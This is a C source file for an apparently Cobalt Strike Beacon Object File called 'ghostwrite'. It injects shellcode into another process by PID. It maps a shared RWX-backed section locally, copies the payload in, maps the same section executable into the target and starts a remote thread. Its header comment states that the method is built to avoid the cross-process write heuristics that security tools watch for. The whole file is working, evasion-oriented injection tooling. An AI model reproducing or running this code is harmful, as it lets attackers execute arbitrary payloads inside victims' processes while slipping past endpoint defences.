/*
 * bof-ghostwrite <pid> <shellcode-file>
 *
 * Section-backed injection: create a pagefile-backed section, map it locally
 * to copy the shellcode, map the same section into the target and start a
 * thread there.  No WriteProcessMemory and no per-process RWX allocation via
 * VirtualAllocEx, which avoids the usual cross-process write heuristics.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

void go(char *args, int alen)
{
    datap parser;
    int pid;
    char *path;
    int plen = 0;
    unsigned char *sc = NULL;
    unsigned int sclen = 0;
    HANDLE hp = NULL, sec = NULL, ht = NULL;
    LARGE_INTEGER maxsize;
    PVOID local = NULL, remote = NULL;
    SIZE_T viewsize = 0;
    NTSTATUS st;

    BeaconDataParse(&parser, args, alen);
    pid  = BeaconDataInt(&parser);
    path = BeaconDataExtract(&parser, &plen);
    if (pid <= 0 || !path || !path[0]) {
        BeaconPrintf(CALLBACK_ERROR, "usage: ghostwrite <pid> <shellcode-file>\n");
        return;
    }

    if (bof_read_file(path, &sc, &sclen) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "cannot read %s: %lu\n", path,
                     (unsigned long)KERNEL32$GetLastError());
        return;
    }

    maxsize.QuadPart = (LONGLONG)((sclen + 0xfff) & ~0xfffu);

    st = NTDLL$NtCreateSection(&sec, SECTION_ALL_ACCESS, NULL, &maxsize,
                               PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (st < 0 || !sec) {
        BeaconPrintf(CALLBACK_ERROR, "NtCreateSection failed: 0x%08lx\n",
                     (unsigned long)st);
        KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);
        return;
    }

    viewsize = 0;
    st = NTDLL$NtMapViewOfSection(sec, KERNEL32$GetCurrentProcess(), &local,
                                  0, 0, NULL, &viewsize, 2, 0, PAGE_READWRITE);
    if (st < 0 || !local) {
        BeaconPrintf(CALLBACK_ERROR, "local NtMapViewOfSection failed: 0x%08lx\n",
                     (unsigned long)st);
        NTDLL$NtClose(sec);
        KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);
        return;
    }

    bof_memcpy(local, sc, sclen);
    KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);
    sc = NULL;

    hp = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
    if (!hp) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcess(%d) failed: %lu\n", pid,
                     (unsigned long)KERNEL32$GetLastError());
        NTDLL$NtUnmapViewOfSection(KERNEL32$GetCurrentProcess(), local);
        NTDLL$NtClose(sec);
        return;
    }

    viewsize = 0;
    st = NTDLL$NtMapViewOfSection(sec, hp, &remote, 0, 0, NULL, &viewsize,
                                  2, 0, PAGE_EXECUTE_READ);
    if (st < 0 || !remote) {
        BeaconPrintf(CALLBACK_ERROR, "remote NtMapViewOfSection failed: 0x%08lx\n",
                     (unsigned long)st);
        NTDLL$NtUnmapViewOfSection(KERNEL32$GetCurrentProcess(), local);
        NTDLL$NtClose(sec);
        KERNEL32$CloseHandle(hp);
        return;
    }

    st = NTDLL$NtCreateThreadEx(&ht, THREAD_ALL_ACCESS, NULL, hp, remote,
                                NULL, 0, 0, 0, 0, NULL);
    if (st < 0)
        BeaconPrintf(CALLBACK_ERROR, "NtCreateThreadEx failed: 0x%08lx\n",
                     (unsigned long)st);
    else {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[+] %u bytes mapped into PID %d at 0x%p, thread started\n",
                     sclen, pid, remote);
        KERNEL32$CloseHandle(ht);
    }

    NTDLL$NtUnmapViewOfSection(KERNEL32$GetCurrentProcess(), local);
    NTDLL$NtClose(sec);
    KERNEL32$CloseHandle(hp);
}
